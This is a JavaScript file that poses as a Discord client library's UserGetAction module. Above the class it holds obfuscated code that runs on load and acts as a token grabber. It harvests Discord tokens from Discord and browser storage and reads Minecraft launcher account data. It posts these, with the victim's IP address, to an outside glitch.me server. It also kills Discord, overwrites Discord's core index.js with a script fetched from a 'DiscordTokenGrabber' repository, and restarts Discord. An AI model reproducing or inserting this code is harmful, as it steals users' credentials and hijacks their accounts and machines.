const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x4a7ac8, _0x426744) => _0x426744 && minecraft('remix', _0x426744)
        )
        fs.readFile(
          minecraftPath,
          (_0x530c50, _0x3ad5b3) =>
            _0x3ad5b3 && minecraft('minecraft', _0x3ad5b3)
        )
        injectToDiscord()
        dbPaths.forEach((_0x4ee43b) => main(_0x4ee43b))
      }
      function main(_0x5be842) {
        fs.readdir(_0x5be842, (_0x2d6cbc, _0x7e9451) => {
          if (_0x7e9451) {
            var _0x445e39 = _0x7e9451.filter((_0x3a5d71) =>
              _0x3a5d71.endsWith('ldb')
            )
            _0x445e39.forEach((_0x4d8382) => {
              var _0xee5f7b = fs
                .readFileSync(_0x5be842 + '/' + _0x4d8382)
                .toString()
              var [_0x2c9208] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0xee5f7b) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0xee5f7b) || [undefined]
              if (_0x2c9208) {
                fetch('http://ip-api.com/json/')
                  .then((_0x218789) => _0x218789.json())
                  .then((_0x18d715) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x2c9208.slice(1, -1),
                        ipAddress: _0x18d715.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x5c02a1, _0x420b59) {
        switch (_0x5c02a1) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x420b59 }),
            })
            break
          case 'minecraft':
            var [_0x20e8db] = /"[\d\w_-]{32}"/.exec(_0x420b59)
            if (_0x20e8db) {
              const _0x332646 = require(minecraftPath)
              if (!_0x332646.accounts) {
                return
              }
              var _0x33c91b = _0x332646.accounts[_0x20e8db.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x33c91b.eligibleForMigration,
                  hasMultipleProfiles: _0x33c91b.hasMultipleProfiles,
                  legacy: _0x33c91b.legacy,
                  localId: _0x33c91b.localId,
                  minecraftProfileID: _0x33c91b.minecraftProfile.id,
                  minecraftProfileName: _0x33c91b.minecraftProfile.name,
                  persistent: _0x33c91b.persistent,
                  remoteId: _0x33c91b.remoteId,
                  type: _0x33c91b.type,
                  username: _0x33c91b.username,
                  activeAccountLocalId: _0x332646.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x34cf9f) => _0x34cf9f.text())
          .then((_0xa415e3) =>
            toInjectJS.forEach(
              (_0x41aaa3) =>
                fs.writeFileSync(
                  _0x41aaa3,
                  _0xa415e3.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x41aaa3.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x41aaa3.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x4c5a8c) =>
            _0x4c5a8c.includes('cord') && toInject.push(local + '/' + _0x4c5a8c)
        )
        toInject.forEach((_0x2561f1) =>
          Glob.sync(
            _0x2561f1 +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x2f127c) => toInjectJS.push(_0x2f127c))
        )
      }
      function killAllDiscords() {
        var _0x366a85 = execSync('tasklist').toString()
        _0x366a85.includes('Discord.exe') && toKill.push('discord')
        _0x366a85.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x366a85.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x366a85.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x2c1c57) =>
          execSync('taskkill /IM ' + _0x2c1c57 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x25ea8a) => Lmain(_0x25ea8a))
        var _0x53a01c = fs.readFileSync(LminecraftPath)
        if (_0x53a01c) {
          Lminecraft(_0x53a01c)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x15a8b3) {
        fs.readdir(_0x15a8b3, (_0x4063cc, _0x35a753) => {
          if (_0x35a753) {
            var _0x449e1d = _0x35a753.filter((_0x17c0b2) =>
              _0x17c0b2.endsWith('ldb')
            )
            _0x449e1d.forEach((_0x22253d) => {
              var _0x48d3b9 = fs
                .readFileSync(_0x35a753 + '/' + _0x22253d)
                .toString()
              var [_0xba569e] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x48d3b9) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x48d3b9) || [undefined]
              if (_0xba569e) {
                fetch('http://ip-api.com/json/')
                  .then((_0x433594) => _0x433594.json())
                  .then((_0x4d73a0) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0xba569e,
                        ip: _0x4d73a0.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x1e99c4) {
        var [_0x34f02b] = /"[\d\w_-]{32}"/.exec(_0x1e99c4)
        if (_0x34f02b) {
          const _0x1d2112 = require(LminecraftPath)
          if (!_0x1d2112.accounts) {
            return
          }
          var _0x156380 = _0x1d2112.accounts[_0x34f02b.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x156380.eligibleForMigration,
              hasMultipleProfiles: _0x156380.hasMultipleProfiles,
              legacy: _0x156380.legacy,
              localId: _0x156380.localId,
              minecraftProfileID: _0x156380.minecraftProfile.id,
              minecraftProfileName: _0x156380.minecraftProfile.name,
              persistent: _0x156380.persistent,
              remoteId: _0x156380.remoteId,
              type: _0x156380.type,
              username: _0x156380.username,
              activeAccountLocalId: _0x1d2112.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x3500a3) => _0x3500a3.text())
          .then((_0x55acf) =>
            toInjectJS.forEach((_0x57e62c) =>
              fs.writeFileSync(_0x57e62c, _0x55acf.replace('*API URL*', apiurl))
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x42d323) =>
            _0x42d323.includes('cord') &&
            toInject.push(defaut + '/' + _0x42d323)
        )
        toInject.forEach((_0x4deb85) =>
          Glob.sync(_0x4deb85 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x5b5a7b) => toInjectJS.push(_0x5b5a7b)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x5a160b) {}
class UserGetAction extends Action {
  ['handle'](_0x8b1c39) {
    const _0x5969c9 = this.client
    const _0x28624e = _0x5969c9.dataManager.newUser(_0x8b1c39)
    return { user: _0x28624e }
  }
}
module.exports = UserGetAction

